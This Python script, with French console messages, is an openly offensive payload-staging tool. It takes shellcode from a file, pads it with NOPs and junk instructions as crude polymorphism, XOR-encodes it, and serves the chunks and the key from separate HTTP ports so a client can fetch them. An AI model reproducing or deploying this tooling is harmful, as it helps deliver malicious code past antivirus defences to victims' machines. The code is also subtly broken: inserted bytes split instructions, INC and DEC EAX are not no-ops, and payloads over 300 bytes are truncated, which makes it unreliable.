import os
import random
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
import time

PORTS = [8000, 8001, 8002]
KEY_PORT = 7999
CHUNK_SIZE = 100
ENCODING_KEY = random.randint(1, 255)

def load_shellcode_from_file():
    file_path = input("[?] Entrez le chemin du fichier contenant le shellcode : ").strip()
    if not os.path.isfile(file_path):
        print("[!] Fichier introuvable. Arrêt.")
        exit(1)
    with open(file_path, "rb") as f:
        return bytearray(f.read())

def xor_obfuscate(data, key):
    return bytearray([b ^ key for b in data])

def insert_nops(data, max_nops=3):
    result = bytearray()
    for b in data:
        result.append(b)
        if random.random() < 0.2:
            for _ in range(random.randint(1, max_nops)):
                result.append(0x90)  # NOP
    return result

def insert_junk_instructions(data):
    junk_instructions = [
        b"\x90",             # NOP
        b"\x87\xC0",         # XCHG EAX, EAX
        b"\x40",             # INC EAX
        b"\x48",             # DEC EAX
        b"\x66\x90"          # 66 NOP
    ]
    result = bytearray()
    for b in data:
        result.append(b)
        if random.random() < 0.1:
            junk = random.choice(junk_instructions)
            result.extend(junk)
    return result

def split_chunks(data, size):
    return [data[i:i+size] for i in range(0, len(data), size)]

class ShellcodeHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        port = self.server.server_port
        chunk = CHUNK_MAP.get(port, b"")
        self.send_response(200)
        self.send_header("Content-Length", str(len(chunk)))
        self.end_headers()
        self.wfile.write(chunk)

class KeyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Length", "1")
        self.end_headers()
        self.wfile.write(bytes([ENCODING_KEY]))

# --- Main Processing ---

raw_shellcode = load_shellcode_from_file()
print(f"[+] Shellcode brut : {len(raw_shellcode)} octets")

mutated = insert_nops(raw_shellcode)
mutated = insert_junk_instructions(mutated)
print(f"[+] Après polymorphisme : {len(mutated)} octets")

obfuscated_shellcode = xor_obfuscate(mutated, ENCODING_KEY)
chunks = split_chunks(obfuscated_shellcode, CHUNK_SIZE)
CHUNK_MAP = dict(zip(PORTS, chunks))

def run_http_server(port, handler):
    HTTPServer(('', port), handler).serve_forever()

for port in PORTS:
    thread = Thread(target=run_http_server, args=(port, ShellcodeHandler), daemon=True)
    thread.start()
    print(f"[+] Serveur HTTP lancé sur le port {port}")

key_thread = Thread(target=run_http_server, args=(KEY_PORT, KeyHandler), daemon=True)
key_thread.start()
print(f"[+] Serveur clé XOR lancé sur le port {KEY_PORT}")

print("\n[*] Clé XOR : 0x{:02X}".format(ENCODING_KEY))
print("[*] Attente de connexion du client...")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Serveur arrêté.")
